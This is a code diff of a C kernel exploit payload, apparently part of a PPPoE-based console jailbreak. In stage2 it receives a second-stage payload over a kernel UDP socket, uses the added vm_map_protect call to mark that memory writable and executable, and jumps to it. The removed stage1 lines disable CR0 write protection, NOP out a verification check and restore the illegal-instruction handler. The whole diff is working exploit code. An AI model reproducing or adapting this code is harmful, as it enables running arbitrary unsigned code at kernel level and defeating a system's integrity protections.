@@ -73,6 +73,8 @@ static void stage2_proc(void *arg) {
       (void *)kdlsym(ksock_bind);
   int (*ksock_recv)(void *so, void *buf, size_t *len) =
       (void *)kdlsym(ksock_recv);
+  int (*vm_map_protect)(void *map, void *start, void *end, int prot, int set_max) =
+      (void *)kdlsym(vm_map_protect);
 
   void *so;
   ksock_create(&so, AF_INET, SOCK_DGRAM, 0);
@@ -90,6 +92,7 @@ static void stage2_proc(void *arg) {
 
   ksock_close(so);
 
+  vm_map_protect(*kernel_map, stage2, stage2 + STAGE2_SIZE, 7, 1);
   void (*entry)(void) = (void *)stage2;
   entry();
 
@@ -99,26 +102,8 @@ static void stage2_proc(void *arg) {
 void stage1(void) {
   uint64_t kaslr_offset = rdmsr(MSR_LSTAR) - kdlsym_addr_Xfast_syscall;
 
-  void (*setidt)(int idx, void *func, int typ, int dpl, int ist) =
-      (void *)kdlsym(setidt);
   int (*kproc_create)(void (*)(void *), void *, void **, int flags, int pages,
                       const char *, ...) = (void *)kdlsym(kproc_create);
-
-  // Disable write protection
-  uint64_t cr0 = rcr0();
-  load_cr0(cr0 & ~CR0_WP);
-
-  // Enable UART
-  *(uint8_t *)kdlsym(uart_patch) = 0;
-
-  // Disable veri
-  *(uint16_t *)kdlsym(veri_patch) = 0x9090;
-
-  // Restore write protection
-  load_cr0(cr0);
-
-  // Restore UD handler
-  setidt(IDT_UD, (void *)kdlsym(Xill), SDT_SYSIGT, SEL_KPL, 0);
 
   // Fix corruption done by nd6_ns_output
   uintptr_t pppoe_softc_list = (uintptr_t)kdlsym(pppoe_softc_list);
